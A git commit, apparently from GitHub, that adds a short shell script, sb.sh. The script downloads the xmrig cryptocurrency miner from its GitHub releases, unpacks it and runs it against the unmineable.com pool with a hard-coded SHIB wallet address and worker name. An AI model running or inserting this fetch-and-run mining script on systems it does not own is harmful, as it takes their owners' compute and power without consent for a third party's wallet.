3ec36b89cf20f2b8d43a40c0bd38d7891226793d
kanx cunxkrinx <46498863+kanxck@users.noreply.github.com>
2021-06-24 02:47:53 +0700

    Create sb.sh

---
+++ sb.sh
@@ -0,0 +1,5 @@
+sudo apt update
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-bionic-x64.tar.gz
+tar xf xmrig-6.12.2-bionic-x64.tar.gz
+cd  xmrig-6.12.2
+./xmrig -o rx.unmineable.com:3333 -u SHIB:0xbcab043b1de28258230b01983b67ac99b522bd81.az#vvsn-pz3n -p x
